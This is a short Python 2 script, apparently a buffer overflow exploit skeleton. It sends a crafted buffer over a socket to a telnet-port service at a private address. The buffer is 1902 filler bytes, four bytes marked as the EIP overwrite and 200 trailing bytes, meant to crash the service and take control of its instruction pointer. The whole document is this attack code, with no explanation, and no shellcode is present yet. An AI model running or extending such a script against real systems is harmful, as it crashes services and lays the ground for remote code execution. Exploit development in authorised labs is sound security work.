#! /usr/bin/python2
import sys
import socket
try:
    payload = "A" * 1902
    EIP = "B" * 4
    rest = "C" * 200
    buffer = payload + EIP + rest
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.0.106", 23))
    s.send(buffer)
    s.close()
    print('done')
except:
    print('error')
